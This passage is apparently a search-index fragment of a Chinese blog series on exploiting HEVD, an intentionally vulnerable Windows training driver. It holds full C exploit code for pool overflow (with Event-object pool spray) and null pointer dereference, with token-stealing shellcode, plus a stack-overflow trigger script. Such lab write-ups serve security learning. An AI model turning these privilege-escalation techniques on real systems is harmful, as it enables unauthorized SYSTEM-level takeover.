\u975e\u6362\u9875\u6c60\u6ea2\u51fa\u6f0f\u6d1e\u5206\u6790"},{"location":"HEVD/nonPagedpooloverflow/#kernel-buffer-event-pool-spray","text":"pool spray \u7ffb\u8bd1\u5e94\u8be5\u662f\u6c60\u55b7\u5c04\u3002\u5b83\u5206\u4e3a\u4e09\u6b65\u3002 \u7b2c\u4e00\u6b65\u901a\u8fc7\u5206\u914d\u5927\u91cf\u8f83\u5c0f\u7684\u975e\u6362\u9875\u6c60\u7a7a\u95f4\u6765\u586b\u8865\u975e\u6362\u9875\u6c60\u4e2d\u5b58\u5728\u7684\u788e\u7247\u3002\u5373\u4f7f\u4e4b\u540e\u8fd8\u5b58\u5728\u788e\u7247\u4e5f\u4e0d\u662f\u6211\u4eec\u7684 kernel buffer \u80fd\u653e\u5f97\u4e0b\u7684 \u901a\u8fc7\u7b2c\u4e00\u6b65\u7684\u94fa\u57ab\u6211\u4eec\u53ef\u4ee5\u8ba4\u4e3a\u63a5\u4e0b\u6765\u5206\u914d\u7684\u7a7a\u95f4\u662f\u8fde\u7eed\u7684\uff0c\u56e0\u6b64\u7b2c\u4e8c\u6b65\u4e3a\u5206\u914d\u4e00\u6bb5\u8fde\u7eed\u7684\u7a7a\u95f4\u8bb0\u4e3a x\u3002 \u7b2c\u4e09\u6b65\u5728 x \u4e2d\u6316\u51fa\u5f88\u591a\u6b63\u597d\u7b26\u5408\u6211\u4eec\u8981\u6c42\u5927\u5c0f\u7684\u6d1e\uff0c\u4ee5\u786e\u4fdd\u6211\u4eec\u7684 kernel buff \u80fd\u6b63\u597d\u88ab\u5206\u914d\u5230\u8fd9\u5176\u4e2d\u7684\u4e00\u4e2a\u6d1e\u4e0a\u5e76\u4e14\u5176\u540e\u7d27\u8ddf\u7684\u662f\u5c5e\u4e8e x \u7684\u7a7a\u95f4\u3002 \u4e0d\u77e5\u9053\u8fd9\u6837\u8bf4\u5927\u5bb6\u80fd\u4e0d\u80fd\u7406\u89e3\uff0c\u6bd5\u7adf\u81ea\u5df1\u662f\u4e2a\u5e7c\u513f\u56ed\u6c34\u5e73\u7684\u753b\u624b\uff0c\u8fd9\u91cc\u5c31\u4e0d\u8d34\u56fe\u4e86\uff0c\u5c31\u7b97\u4e0d\u80fd\u7406\u89e3\u7b49\u4f1a\u513f\u770b\u770b\u4ee3\u7801\u518d\u6765\u56de\u987e\u4e00\u4e0b\u5e94\u8be5\u80fd\u61c2\u5427\u3002 \u6240\u4ee5\u4e3a\u4ec0\u4e48\u6211\u4eec\u8981\u7528 Event \u5bf9\u8c61\u5462? \u56e0\u4e3a\u6211\u4eec\u7684 kernel buffer \u5728\u6c60\u4e2d\u7684\u5927\u5c0f\u4e3a 0x200(0x1f8 + 0x8)\uff0c\u800c Event \u5bf9\u8c61\u5728\u6c60\u4e2d\u7684\u5927\u5c0f\u4e3a 0x40\u30020x40 * 8 = 0x200\u3002\u56e0\u6b64\uff0c\u6211\u4eec\u53ea\u8981\u56de\u6536 8 \u4e2a Event \u5bf9\u8c61\u5c31\u80fd\u5728 x \u4e2d\u6316\u51fa\u4e00\u4e2a 0x200 \u5927\u5c0f\u7684\u6d1e\u3002\u800c\u4e14 0x40 \u4e5f\u6ee1\u8db3\u7b2c\u4e00\u6b65\u7684\u8981\u6c42\u3002","title":"\u4fdd\u8bc1 kernel buffer \u540e\u7d27\u8ddf Event \u5bf9\u8c61 (pool spray)"},{"location":"HEVD/nonPagedpooloverflow/#typeindex","text":"\u5c31\u50cf\u6808\u6ea2\u51fa\u4e00\u6837\uff0c\u6211\u4eec\u53ea\u8981\u901a\u8fc7\u6ea2\u51fa\u5c31\u80fd\u6539\u5199\u7d27\u8ddf\u5728 kernel buffer \u540e\u7684\u5185\u5b58\u7a7a\u95f4\u4e86\uff0c\u56e0\u6b64\u8986\u76d6 TypeIndex \u4e0d\u662f\u4ec0\u4e48\u95ee\u9898\u3002\u4f46\u662f\u8fd9\u91cc\u8981\u6ce8\u610f\u7684\u662f\u4e0d\u80fd\u7834\u574f\u539f\u672c\u7684 Event \u5bf9\u8c61\u7684\u7ed3\u6784\uff0c\u7279\u522b\u662f\u6c60\u5934\uff0c\u4e0d\u7136\u76f4\u63a5\u84dd\u5c4f\u3002\u56e0\u6b64\u6211\u4eec\u53ea\u4fee\u6539\u90a3\u4e48\u4e00\u4e2a\u5b57\u8282\u5c31\u597d\u4e86\u3002","title":"\u8986\u76d6 TypeIndex"},{"location":"HEVD/nonPagedpooloverflow/#object-type","text":"\u6211\u4eec\u53ef\u4ee5\u901a\u8fc7 NtAllocateVirtualMemory \u6765\u5206\u914d\u57fa\u5740\u4e3a 0x00000000 \u7684\u5185\u5b58\u7a7a\u95f4\uff0c\u4f7f\u5176\u53d8\u6210\u53ef\u8bfb\u5199\u7684\u5b58\u5728\uff0c\u7136\u540e\u901a\u8fc7 WriteProcessMemory \u6765\u4e3a CloseProcedure \u8d4b\u503c\u3002","title":"\u4f2a\u9020 object type"},{"location":"HEVD/nonPagedpooloverflow/#shellcode","text":"\u901a\u8fc7 CloseHandle \u6765\u56de\u6536\u88ab\u6211\u4eec\u4fee\u6539\u8fc7\u7684 Event \u5bf9\u8c61\u5c31\u80fd\u89e6\u53d1 CloseProcedure \u6765\u6267\u884c\u6211\u4eec\u7684 shellcode \u7684\u3002\u4f46\u95ee\u9898\u662f\u6211\u4eec\u4e0d\u77e5\u9053\u54ea\u4e00\u5757\u624d\u662f\u6211\u4eec\u4fee\u6539\u8fc7\u7684 Event \u5bf9\u8c61\u3002\u6ca1\u5173\u7cfb\uff0c\u6211\u4eec\u76f4\u63a5\u628a\u5269\u4e0b\u7684\u7a7a\u95f4\u5168\u90e8\u56de\u6536\u4e86\u5c31\u884c\uff0c\u800c\u4e14\u8fd9\u624d\u662f\u6b63\u786e\u7684\u7f16\u7a0b\u4e60\u60ef\uff0c\u4e0d\u7136\u5c31\u4f1a\u53d8\u6210\u4e00\u76f4\u5360\u7740\u6c60\u7a7a\u95f4\u4e0d\u7528\u4e86\u3002","title":"\u6267\u884c shellcode"},{"location":"HEVD/nonPagedpooloverflow/#0x02","text":"\u901a\u8fc7\u4e0a\u9762\u7684\u5206\u6790\u6211\u4eec\u5df2\u7ecf\u77e5\u9053\u5982\u4f55\u5229\u7528\u6f0f\u6d1e\u6765\u6267\u884c shellcode \u4e86\uff0c\u63a5\u4e0b\u6765\u8d34\u51fa\u6e90\u7801\u770b\u770b\u7ec6\u8282 // nonPagedpooloverflow.cpp : Defines the entry point for the console application. // #include stdafx.h #include windows.h #include Memoryapi.h #include intrin.h typedef NTSTATUS ( WINAPI * NtAllocateVirtualMemory_t ) ( HANDLE ProcessHandle , PVOID * BaseAddress , ULONG_PTR ZeroBits , PSIZE_T RegionSize , ULONG AllocationType , ULONG Protect ); char shellcode [] = { \\x90\\x90\\x90\\x90 // NOP Sled \\x60 // pushad \\x31\\xc0 // xor eax,eax \\x64\\x8b\\x80\\x24\\x01\\x00\\x00 // mov eax,[fs:eax+0x124] \\x8b\\x40\\x50 // mov eax,[eax+0x50] \\x89\\xc1 // mov ecx,eax \\xba\\x04\\x00\\x00\\x00 // mov edx,0x4 \\x8b\\x80\\xb8\\x00\\x00\\x00 // mov eax,[eax+0xb8] \\x2d\\xb8\\x00\\x00\\x00 // sub eax,0xb8 \\x39\\x90\\xb4\\x00\\x00\\x00 // cmp [eax+0xb4],edx \\x75\\xed // jnz 0x1a \\x8b\\x90\\xf8\\x00\\x00\\x00 // mov edx,[eax+0xf8] \\x89\\x91\\xf8\\x00\\x00\\x00 // mov [ecx+0xf8],edx \\x61 // popad \\xC2\\x10\\x00 // ret 16 }; int main () { char buf [ 504 ] = { 0 }; memset ( buf , A , sizeof ( buf )); char * payload = ( char * ) malloc ( sizeof ( buf ) + 40 ); memcpy ( payload , buf , sizeof ( buf )); char * temp = payload + 504 ; * ( PULONG ) temp = ( ULONG ) 0x04080040 ; temp = ( char * )(( ULONG ) temp + 0x4 ); * ( PULONG ) temp = ( ULONG ) 0xee657645 ; temp = ( char * )(( ULONG ) temp + 0x4 ); * ( PULONG ) temp = ( ULONG ) 0x00000000 ; temp = ( char * )(( ULONG ) temp + 0x4 ); * ( PULONG ) temp = ( ULONG ) 0x00000040 ; temp = ( char * )(( ULONG ) temp + 0x4 ); * ( PULONG ) temp = ( ULONG ) 0x00000000 ; temp = ( char * )(( ULONG ) temp + 0x4 ); * ( PULONG ) temp = ( ULONG ) 0x00000000 ; temp = ( char * )(( ULONG ) temp + 0x4 ); * ( PULONG ) temp = ( ULONG ) 0x00000001 ; temp = ( char * )(( ULONG ) temp + 0x4 ); * ( PULONG ) temp = ( ULONG ) 0x00000001 ; temp = ( char * )(( ULONG ) temp + 0x4 ); * ( PULONG ) temp = ( ULONG ) 0x00000000 ; temp = ( char * )(( ULONG ) temp + 0x4 ); * ( PULONG ) temp = ( ULONG ) 0x00080000 ; // begin exp LPVOID ptr = VirtualAlloc ( 0 , sizeof ( shellcode ), 0x3000 , 0x40 ); RtlCopyMemory ( ptr , shellcode , sizeof ( shellcode )); HMODULE hmodule = LoadLibraryA ( ntdll.dll ); NtAllocateVirtualMemory_t NtAllocateVirtualMemory = ( NtAllocateVirtualMemory_t ) GetProcAddress ( hmodule , NtAllocateVirtualMemory ); if ( NtAllocateVirtualMemory == NULL ) { printf ( getprocaddress failed \\n ); return 0 ; } PVOID baseAddress = ( PVOID ) 1 ; ULONG regionsize = 0x100 ; NTSTATUS status = NtAllocateVirtualMemory (( HANDLE ) 0xFFFFFFFF , baseAddress , 0 , regionsize , 0x3000 , 0x40 ); if ( status != 0 ) { printf ( alloc failed,error code is:%u \\n , status ); return 0 ; } if ( ! WriteProcessMemory (( HANDLE ) 0xFFFFFFFF , ( LPVOID ) 0x60 , ptr , 0x4 , NULL )) { printf ( write failed \\n ); return 0 ; } int i = 0 ; int j = 0 ; HANDLE spray1 [ 10000 ]; HANDLE spray2 [ 5000 ]; for ( i = 0 ; i 10000 ; i ++ ) { spray1 [ i ] = CreateEventA ( NULL , FALSE , FALSE , NULL ); } for ( i = 0 ; i 5000 ; i ++ ) { spray2 [ i ] = CreateEventA ( NULL , FALSE , FALSE , NULL ); } for ( i = 0 ; i ( sizeof ( spray2 ) / sizeof ( HANDLE )); i = i + 16 ) { for ( j = 0 ; j 8 ; j ++ ) { CloseHandle ( spray2 [ i + j ]); } } HANDLE hevDevice = CreateFileA ( \\\\\\\\ . \\\\ HackSysExtremeVulnerableDriver , 0xC0000000 , 0 , NULL , 0x3 , 0 , NULL ); DWORD lpBytesReturned = 0 ; DeviceIoControl ( hevDevice , 0x22200f , payload , sizeof ( buf ) + 40 , NULL , 0 , lpBytesReturned , NULL ); for ( i = 8 ; i ( sizeof ( spray2 ) / sizeof ( HANDLE )); i = i + 16 ) { for ( j = 0 ; j 8 ; j ++ ) { CloseHandle ( spray2 [ i + j ]); } } for ( i = 0 ; i 10000 ; i ++ ) { CloseHandle ( spray1 [ i ]); } system ( whoami ); return 0 ; } \u6e90\u7801\u90e8\u5206\u5c31\u4e0d\u7ec6\u8bf4\u4e86\uff0c\u5927\u5bb6\u5bf9\u7167\u7740 0x01 \u5c0f\u8282\u770b\u5c31\u597d\u4e86\u3002\u8fd9\u91cc\u8bf4\u4e00\u4e0b\u4e24\u4e2a\u5730\u65b9\u3002 \u7b2c\u4e00\u4e2a\u662f NtAllocateVirtualMemory\u3002\u4f60\u53ef\u80fd\u4f1a\u50cf\u6211\u4e00\u6837\u597d\u5947\u7b2c\u4e8c\u4e2a\u53c2\u6570\u7684\u503c\u4e3a\u4ec0\u4e48\u662f 1\u3002\u6211\u4eec\u770b\u770b\u5b98\u65b9\u6587\u6863\u600e\u4e48\u8bf4\u7684 \u9996\u5148\u6211\u4eec\u4e0d\u80fd\u8ba9\u7cfb\u7edf\u81ea\u5df1\u5206\u914d\uff0c\u56e0\u4e3a\u6211\u4eec\u8981\u786e\u5207\u5730\u4ece 0x00000000 \u5f00\u59cb\u5206\u914d\u3002\u7136\u540e\u8fd9\u4e2a\u503c\u6839\u636e\u6211\u7684\u6d4b\u8bd5\u7ed3\u679c\u53ea\u8981\u4f60\u586b\u4e00\u4e2a\u5927\u4e8e 0 \u7684\u6570\u7cfb\u7edf\u90fd\u4f1a\u4ece 0x00000000 \u5f00\u59cb\u5206\u914d\uff0c\u5176\u533a\u522b\u53ea\u5728\u4e8e\u5f71\u54cd\u5230\u7b2c\u56db\u4e2a\u53c2\u6570(RegionSize)\u7684\u8fd4\u56de\u503c\u3002\u6587\u6863\u4e0a\u8bf4\u662f rounded down\uff0c\u8fd9\u5e94\u8be5\u662f\u4e00\u4e2a\u56db\u820d\u4e94\u5165\u7684\u7b97\u6cd5\uff0c\u5177\u4f53\u4ece\u591a\u5c11\u5f00\u59cb rounded \u5230\u4e0b\u4e00\u4e2a\u6211\u4e0d\u592a\u6e05\u695a\uff0c\u53cd\u6b63\u5c0f\u4e00\u70b9\u5206\u914d\u672c\u9875\u9762\uff0c\u5927\u4e00\u70b9\u5c31\u662f\u8fde\u4e0b\u4e00\u4e2a\u9875\u9762\u90fd\u5206\u914d\u4e86\u3002\u56e0\u6b64\u8fd9\u4e2a\u503c\u53ea\u8981\u662f\u4e2a\u5927\u4e8e 0 \u7684\u6570\u5c31\u884c\u3002 \u7136\u540e\u662f\u5806\u6808\u5e73\u8861\u95ee\u9898\u3002 call dword ptr [edi + 60h] \u662f\u5b9e\u9645\u8c03\u7528\u6211\u4eec shellcode \u7684\u8bed\u53e5\u3002\u56e0\u4e3a\u5728\u8c03\u7528\u51fd\u6570\u524d\u538b\u5165\u4e86 4 \u4e2a\u53c2\u6570\uff0c\u6240\u4ee5\u6211\u4eec\u5728\u6700\u540e\u9700\u8981 ret 16","title":"0x02 \u975e\u6362\u9875\u6c60\u6ea2\u51fa\u6f0f\u6d1e\u5229\u7528"},{"location":"HEVD/nonPagedpooloverflow/#0x03","text":"\u8fd9\u6b21\u975e\u6362\u9875\u6c60\u6ea2\u51fa\u611f\u89c9\u53c8\u5b66\u5230\u4e86\u5f88\u591a\u4e1c\u897f\uff0c\u5199 exp \u4e5f\u719f\u7ec3\u591a\u4e86\uff0c\u867d\u7136\u53c8\u662f\u4e00\u5929\u6109\u5feb\u7684 error 99999 \uff1a ) 2019.9.3","title":"0x03 \u7ed3\u675f\u8bed"},{"location":"HEVD/nullpointerDereference/","text":"\u8f6c\u8f7d\u8bf7\u6ce8\u660e\u51fa\u5904\u54e6 : ) \u4e0d\u662f\uff0c\u8bb2\u9053\u7406\u6709\u4e0a\u4e00\u7bc7\u7684\u94fa\u57ab\u8fd9\u6b21\u5229\u7528\u4e5f\u592a\u7b80\u5355\u4e86\u5427\u3002 \u770b\u5230 NullPointerDereference.c \u6587\u4ef6\uff0c\u6211\u4eec\u7684\u8f93\u5165\u82e5\u4e0d\u7b49\u4e8e MagicValue \u7684\u8bdd NullPointerDereference \u53c8\u53d8\u4e3a NULL \u6307\u9488\uff0c\u800c\u540e\u9762\u4e0d\u68c0\u67e5 NullPointerDereference \u662f\u5426\u4e3a NULL \u6307\u9488\u76f4\u63a5\u8c03\u7528 NullPointerDereference- Callback() \u770b\u5230\u8fd9\u91cc\u5229\u7528\u65b9\u6cd5\u4e0d\u5c31\u662f\u4e0a\u4e00\u7bc7\u4e2d\u7684\u4e00\u73af\u5417\uff1f\u82e5\u6709\u4e0d\u6e05\u695a\u7684\u670b\u53cb\u53ef\u4ee5\u5148\u505a\u4e00\u4e0b\u6c60\u6ea2\u51fa\uff0c\u8fd9\u91cc\u5c31\u4ec0\u4e48\u90fd\u4e0d\u89e3\u91ca\u76f4\u63a5\u8d34 exp \u4e86\u3002 // nullpointerDereference.cpp : Defines the entry point for the console application. // #include stdafx.h #include windows.h #include Memoryapi.h typedef NTSTATUS ( WINAPI * NtAllocateVirtualMemory_t ) ( HANDLE ProcessHandle , PVOID * BaseAddress , ULONG_PTR ZeroBits , PSIZE_T RegionSize , ULONG AllocationType , ULONG Protect ); char shellcode [] = { \\x90\\x90\\x90\\x90 // NOP Sled \\x60 // pushad \\x31\\xc0 // xor eax,eax \\x64\\x8b\\x80\\x24\\x01\\x00\\x00 // mov eax,[fs:eax+0x124] \\x8b\\x40\\x50 // mov eax,[eax+0x50] \\x89\\xc1 // mov ecx,eax \\xba\\x04\\x00\\x00\\x00 // mov edx,0x4 \\x8b\\x80\\xb8\\x00\\x00\\x00 // mov eax,[eax+0xb8] \\x2d\\xb8\\x00\\x00\\x00 // sub eax,0xb8 \\x39\\x90\\xb4\\x00\\x00\\x00 // cmp [eax+0xb4],edx \\x75\\xed // jnz 0x1a \\x8b\\x90\\xf8\\x00\\x00\\x00 // mov edx,[eax+0xf8] \\x89\\x91\\xf8\\x00\\x00\\x00 // mov [ecx+0xf8],edx \\x61 // popad \\xC3 // ret }; int main () { LPVOID ptr = VirtualAlloc ( 0 , sizeof ( shellcode ), 0x3000 , 0x40 ); RtlCopyMemory ( ptr , shellcode , sizeof ( shellcode )); HMODULE hmodule = LoadLibraryA ( ntdll.dll ); NtAllocateVirtualMemory_t NtAllocateVirtualMemory = ( NtAllocateVirtualMemory_t ) GetProcAddress ( hmodule , NtAllocateVirtualMemory ); if ( NtAllocateVirtualMemory == NULL ) { printf ( getprocaddress failed \\n ); return 0 ; } PVOID baseAddress = ( PVOID ) 1 ; ULONG regionsize = 0x100 ; NTSTATUS status = NtAllocateVirtualMemory (( HANDLE ) 0xFFFFFFFF , baseAddress , 0 , regionsize , 0x3000 , 0x40 ); if ( status != 0 ) { printf ( alloc failed,error code is:%u \\n , status ); return 0 ; } if ( ! WriteProcessMemory (( HANDLE ) 0xFFFFFFFF , ( LPVOID ) 0x04 , ptr , 0x4 , NULL )) { printf ( write failed \\n ); return 0 ; } int value = 0x1 ; int * payload = value ; HANDLE hevDevice = CreateFileA ( \\\\\\\\ . \\\\ HackSysExtremeVulnerableDriver , 0xC0000000 , 0 , NULL , 0x3 , 0 , NULL ); DWORD lpBytesReturned = 0 ; DeviceIoControl ( hevDevice , 0x22202b , payload , 0x4 , NULL , 0 , lpBytesReturned , NULL ); system ( whoami ); return 0 ; } \u5173\u4e8e\u5806\u6808\u5e73\u8861\u95ee\u9898\uff0c\u50cf\u8fd9\u79cd\u76f4\u63a5 NullPointerDereference- Callback() \u6ca1\u6709\u53c2\u6570\u7684\u6211\u4eec\u5c31\u76f4\u63a5 ret \u5c31\u597d\u4e86\u3002 \uff1a ) 2019.9.4","title":"\uff08\u56db\uff09HEVD \u7a7a\u6307\u9488\u5f15\u7528"},{"location":"HEVD/stackoverflow/","text":"\u8f6c\u8f7d\u8bf7\u6ce8\u660e\u51fa\u5904\u54e6 : ) 0x00 \u524d\u8a00 \u8fd9\u662fHEVD\u6f0f\u6d1e\u5229\u7528\u5b66\u4e60\u7684\u7b2c\u4e00\u7bc7\uff0c\u6240\u4ee5\u672c\u7bc7\u5c31\u5c3d\u53ef\u80fd\u5730\u9610\u8ff0\u5f97\u8be6\u7ec6\u4e00\u4e9b\uff0c\u5305\u62ec\u4ece\u54ea\u91cc\u5f00\u59cb\u5165\u624b\uff0c\u6574\u4e2a\u8fc7\u7a0b\u6211\u4eec\u5e94\u8be5\u8981\u505a\u4ec0\u4e48\u4ee5\u53ca\u6f0f\u6d1e\u7684\u5206\u6790\u5229\u7528\u3002\u540e\u7eed\u7684HEVD\u7bc7\u7ae0\u5c06\u4fa7\u91cd\u4e8e\u5bf9\u6f0f\u6d1e\u7684\u5206\u6790\u53ca\u5176\u5229\u7528\u3002 \u65e2\u7136\u662f\u7b2c\u4e00\u7bc7\uff0c\u6211\u4eec\u5c31\u4ece\u6700\u7b80\u5355\u7684\u6808\u6ea2\u51fa\u5165\u624b\u5427\u3002 0x01 windbg preview \u4e2d\u65e0\u6cd5\u663e\u793a dbgprint \u6d88\u606f\u7684\u95ee\u9898 \u9996\u5148\u672c\u8282\u548cHEVD\u6f0f\u6d1e\u5229\u7528\u5b66\u4e60\u6ca1\u6709\u5173\u7cfb\uff0c\u5373\u4f7f\u8fd9\u4e2a\u95ee\u9898\u4e0d\u89e3\u51b3\u4e5f\u53ef\u4ee5\u987a\u5229\u5730\u5b8c\u6210\u5229\u7528\u3002\u672c\u8282\u53ea\u662f\u5199\u7ed9\u548c\u6211\u4e00\u6837\u6709\u70b9\u513f\u5f3a\u8feb\u75c7\u7684\u201c\u60a3\u8005\u201d : ) \u5982\u56fe\u6240\u793a\uff0cDbgPrint \u51fd\u6570\u7684\u6267\u884c\u7ed3\u679c\u65e0\u6cd5\u88ab windbg \u63a5\u53d7\u5230\u3002 \u8fd9\u65f6\u5019\u4f60\u5982\u679c\u611f\u89c9\u5947\u602a\u5e76\u4e14\u60f3\u770b\u5230 DbgPrint \u51fd\u6570\u7684\u8f93\u51fa\u7ed3\u679c\u7684\u8bdd\u4f60\u5c31\u4f1a\u5f00\u59cb\u4e0a\u7f51\u641c\u7d22\u7c7b\u4f3c\u4e8e\u672c\u8282\u6807\u9898\u7684\u5185\u5bb9\u3002 \u7136\u540e\uff0c\u4f60\u53ef\u4ee5\u770b\u5230\u5f88\u591a\u7684\u7ed3\u679c\uff0c\u4f46\u662f\u51e0\u4e4e\u6240\u6709\u7684\u7b54\u6848\u90fd\u662f\u544a\u8bc9\u4e86\u4f60\u8fd9\u4e24\u4e2a\u65b9\u6cd5 \u952e\u5165 ed Kd_DEFAULT_MASK 8 (\u6216\u662f 0xf \u6216\u662f 0xffffffff\uff0c\u8fd9\u4e2a\u4e0d\u91cd\u8981\uff0c\u53ea\u8981 8 \u90a3\u4e00\u4f4d\u4e3a 1 \u5c31\u53ef\u4ee5\u4e86) \u6dfb\u52a0\u6ce8\u518c\u8868\u952e HKLM\\SYSTEM\\CurrentControlSet\\Control\\Session Manager\\Debug Print Filter \u7684\u4e00\u4e2a\u540d\u53eb DEFAULT \u768432\u4f4dDWORD\u503c\u4e3a 8 (\u540c\u7406\u6216\u662f0xf \u6216\u662f 0xffffffff) \u5f53\u7136\u8fd9\u65f6\u5019\u5982\u679c\u8d77\u4f5c\u7528\u7684\u8bdd\u81ea\u7136\u662f\u6700\u597d\uff0c\u5982\u679c\u4e0d\u8d77\u4f5c\u7528\u7684\u8bdd\u53ef\u4ee5\u8bd5\u8bd5\u4ee5\u4e0b\u89e3\u51b3\u529e\u6cd5\u3002 \u9996\u5148\u5728\u8981\u8c03\u8bd5\u7684\u673a\u5668\uff08\u8fd9\u91cc\u662f\u6211\u7684win7\u865a\u62df\u673a\uff09\u4e0a\u4ee5\u7ba1\u7406\u5458\u6743\u9650\u8fd0\u884c DebugView\uff0c\u7136\u540e\u52fe\u9009\u4e0a Capture Kernel \u548c Enable Verbose Kernel Output \u4e4b\u540e\u4f7f\u7528 windbg \u8c03\u8bd5\u5c31\u53ef\u4ee5\u770b\u5230 DbgPrint \u8f93\u51fa\u7684\u6d88\u606f\u4e86 \u4e0d\u8fc7\u8fd9\u662f\u4e2a\u4ec0\u4e48\u539f\u7406\u6211\u4e5f\u641e\u4e0d\u61c2\u3002 \u8fd8\u6709\u4e2a\u95ee\u9898\u5c31\u662f\u4ece\u56fe\u4e2d\u53ef\u4ee5\u770b\u5230\u6211\u6572\u5b8c\u547d\u4ee4\u540e\u4e00\u76f4\u51fa\u6765\u4e00\u53e5 DBGHELP: HEVD is not indexed \uff0c\u867d\u7136\u4e0d\u5f71\u54cd\u5206\u6790\u4f46\u662f\u6709\u6ca1\u6709\u5927\u54e5\u77e5\u9053\u8fd9\u662f\u4ec0\u4e48\u610f\u601d\u4ee5\u53ca\u600e\u4e48\u89e3\u51b3\uff1f 0x02 HEVD \u6808\u6ea2\u51fa\u6f0f\u6d1e\u5206\u6790 \u9996\u5148\u770b\u5230\u6211\u4eec\u4e0b\u8f7d\u7684 HEVD \u9879\u76ee\uff0c\u6211\u4eec\u53ef\u4ee5\u770b\u5230\u6709\u8fd9\u4e48\u4e24\u4e2a\u6587\u4ef6\u5939 HackSysExtremeVulnerableDriver/Driver/HEVD: HEVD.sys \u9a71\u52a8\u7a0b\u5e8f\u7684 build \u6e90\u7801 HackSysExtremeVulnerableDriver/Exploit: HEVD \u7684\u6f0f\u6d1e\u5229\u7528\u4ee3\u7801 \u6253\u5f00 /Driver/HEVD \u6587\u4ef6\u5939\u4e0b\u7684 BufferOverflowStack.c \u6587\u4ef6\uff0c\u8fd9\u5c31\u662f\u6808\u6ea2\u51fa\u6f0f\u6d1e\u7684\u6240\u5728\u3002\u9605\u8bfb\u4e00\u4e0b\u6e90\u7801\u6211\u4eec\u53ef\u4ee5\u5f88\u5bb9\u6613\u5730\u770b\u5230\u6f0f\u6d1e\u5728 TriggerBufferOverflowStack \u51fd\u6570\u4e2d \u5f88\u663e\u7136\u5730\u544a\u8bc9\u4e86\u6211\u4eec\u6f0f\u6d1e\u4ea7\u751f\u7684\u539f\u56e0\u662f\u56e0\u4e3a\u6ca1\u6709\u68c0\u67e5 UserBuffer \u7684\u5927\u5c0f\u76f4\u63a5\u5c06\u5b83\u590d\u5236\u7ed9\u4e86 KernelBuffer\u3002\u5927\u5bb6\u90fd\u77e5\u9053\u4e00\u65e6\u6709\u6808\u6ea2\u51fa\u6f0f\u6d1e\u4ea7\u751f\uff0c\u6211\u4eec\u5c31\u53ef\u4ee5\u63a7\u5236\u6307\u4ee4\u6d41\u4e86\u3002HEVD \u9879\u76ee\u4e2d\u7528\u63d0\u6743\u6765\u9a8c\u8bc1\u8fd9\u4e2a\u6f0f\u6d1e\uff0c\u6211\u4eec\u80fd\u505a\u7684\u5f53\u7136\u4e0d\u4ec5\u5982\u6b64\uff0c\u4e0d\u8fc7\u8fd9\u91cc\u6211\u4eec\u4e5f\u7528\u63d0\u6743\u6765\u9a8c\u8bc1\u8fd9\u4e2a\u6f0f\u6d1e\u3002 \u63a5\u4e0b\u6765\u5206\u6790\u4e00\u4e0b\u9a71\u52a8\u7a0b\u5e8f\u7684\u6267\u884c\u6d41 \u53ef\u4ee5\u770b\u5230\u4ece\u5165\u53e3\u51fd\u6570\u8fdb\u6765\u4ee5\u540e\u5148\u5230\u4e86 IrpDeviceIoCtlHandler \u4e2d\u7136\u540e\u624d\u662f\u5230\u6211\u4eec\u7684\u6f0f\u6d1e\u51fd\u6570\uff0c\u8ddf\u8fdb IrpDeviceIoCtlHandler \u51fd\u6570\u4e2d\u770b\u4e00\u4e0b \u770b\u5230\u7ea2\u6846\u4e2d\u7684\u6c47\u7f16\u4ee3\u7801\u3002[ebp + IoControlCode] \u5c31\u662f\u6211\u4eec\u8f93\u5165\u7684 IO Control Code\u3002\u5927\u5bb6\u7a0d\u4f5c\u5206\u6790\u5c31\u80fd\u5f97\u51fa\u5f53\u6211\u4eec\u7684 IO Control Code \u7b49\u4e8e 0x222003 \u65f6\uff0c\u5728\u6700\u540e\u4e00\u53e5 jmp \u6307\u4ee4\u4e2d ecx \u5c31\u7b49\u4e8e 0\u3002\u5f53\u6700\u540e\u4e00\u53e5 jmp \u4e2d ecx \u7b49\u4e8e0 \u65f6\u5c31\u4f1a\u8df3\u8f6c\u5230 $LN5\u3002\u800c $LN5 \u4e2d\u7684\u6307\u4ee4\u5c06\u8df3\u8f6c\u5230\u51fd\u6570 BufferOverflowStackIoctlHandler \u4e2d\u3002\uff08\u5176\u4e2d\u7684\u6807\u8bc6\u7b26\u540d\u79f0\u53ef\u80fd\u4f1a\u4e0d\u4e00\u6837\uff0c\u4f46\u601d\u8def\u662f\u4e00\u6837\u7684\uff09 \u5230\u76ee\u524d\u4e3a\u6b62\u6211\u4eec\u5c31\u53ef\u4ee5\u901a\u8fc7\u4ee5\u4e0b\u4ee3\u7801\u8fdb\u5165\u6f0f\u6d1e\u51fd\u6570 TriggerBufferOverflowStack \u4e86\uff08HEVD \u9879\u76ee\u4f7f\u7528 c \u6765\u7f16\u5199 exp\uff0c\u4e2a\u4eba\u8fd8\u662f\u89c9\u5f97\u7528 python \u6765\u7f16\u5199 exp \u66f4\u65b9\u4fbf\u4e00\u4e9b\uff09 import ctypes , sys from ctypes import * kernel32 = windll . kernel32 # 0xC0000000 \u524d\u56db\u4f4d\u4e3a 1100,\u7b49\u540c\u4e8eGENERIC_READ | GENERIC_WRITE,\u5373\u8bfb\u5199\u6743\u9650 # 0x3 \u4e3a 0011,\u7b49\u540c\u4e8eFILE_ATTRIBUTE_READONLY | FILE_ATTRIBUTE_HIDDEN,\u5373\u53ea\u8bfb\u548c\u9690\u85cf\u5c5e\u6027 hevDevice = kernel32 . CreateFileA ( \\\\\\\\ . \\\\ HackSysExtremeVulnerableDriver , 0xC0000000 , 0 , None , 0x3 , 0 , None ) if not hevDevice or hevDevice == - 1 : print *** Couldn t get Device Driver handle. sys . exit ( 0 ) buf = A * 2048 bufLength = len ( buf ) kernel32 . DeviceIoControl ( hevDevice , 0x222003 , buf , bufLength , None , 0 , byref ( c_ulong ()), None ) \u76f8\u5173\u51fd\u6570\u82e5\u4e0d\u4e86\u89e3\u5c31\u81ea\u884c\u67e5\u9605\u76f8\u5173\u6587\u6863\u5427\u3002 \u5230\u76ee\u524d\u4e3a\u6b62\u6211\u4eec\u5df2\u7ecf\u53ef\u4ee5\u8fdb\u5165\u6f0f\u6d1e\u51fd\u6570\u4e86\uff0c\u90a3\u4e48\u63a5\u4e0b\u6765\u5c31\u662f\u5982\u4f55\u5229\u7528\u6f0f\u6d1e\u51fd\u6570\u7684\u95ee\u9898\u4e86\uff0c\u60f3\u60f3\u6211\u4eec\u63a5\u4e0b\u6765\u9700\u8981\u54ea\u4e9b\u4e1c\u897f\uff1f \u5982\u4f55\u89e6\u53d1\u6f0f\u6d1e 